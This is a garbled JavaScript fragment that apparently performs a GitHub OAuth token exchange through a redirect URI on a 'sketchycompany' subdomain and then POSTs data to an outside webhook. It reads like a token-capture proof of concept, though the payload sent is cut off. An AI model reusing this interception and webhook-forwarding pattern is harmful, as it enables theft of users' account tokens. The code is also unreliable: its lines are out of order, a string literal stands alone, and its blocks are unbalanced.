                    signal: AbortSignal.timeout(5000),
                });
            } catch (e) {

                console.error("REPORT FAILED", event, extra, e);

                "https://github-13261.sketchycompany.upd-dcs.work/callback",
            );

            try {
                tokenResponse = await fetch(TOKEN_URL, {

                    headers: {
                        "Content-Type": "application/x-www-form-urlencoded",
                    },
                    body: formBody,
                    signal: AbortSignal.timeout(15000),
                });
            } catch (error) {
                await report("token fetch threw", {
                    name: error.name,                 // "TimeoutError" vs "TypeError" vs "AbortError"
                    message: error.message,
                    timedOut: error.name === "TimeoutError",
                });
                return;
            }

            await report("token headers received", {
                status: tokenResponse.status,
                statusText: tokenResponse.statusText,
                contentType: tokenResponse.headers.get("content-type"),
                contentLength: tokenResponse.headers.get("content-length"),
                acao: tokenResponse.headers.get("access-control-allow-origin"),
            })

            stage.name = "body";

            } catch (error) {

            }

            await fetch(WEBHOOK, {
                method: "POST",
                headers: { "Content-Type": "text/plain" },
